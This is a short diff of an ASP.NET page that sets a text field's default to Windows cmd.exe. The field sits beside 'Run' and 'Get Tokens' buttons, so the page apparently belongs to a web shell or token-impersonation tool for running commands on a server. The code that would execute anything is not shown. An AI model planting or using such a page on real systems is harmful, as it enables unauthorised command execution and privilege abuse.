@@ -499,7 +499,7 @@
         <br/><br/>  
             <asp:DropDownList ID="DropDownList" name="dropdown" runat="server" width="250px" >  
             </asp:DropDownList>
-            <input type="text" name="file" style='width:23em' value="" />
+            <input type="text" name="file" style='width:23em' value="c:\windows\system32\cmd.exe" />
             <asp:Button ID="run" runat="server" style='width:6em' Text="Run" onClick="RunThings" /> 
             <asp:Button ID="refresh" runat="server" Text="Get Tokens" onClick="Refresh"/> 
             <br> 
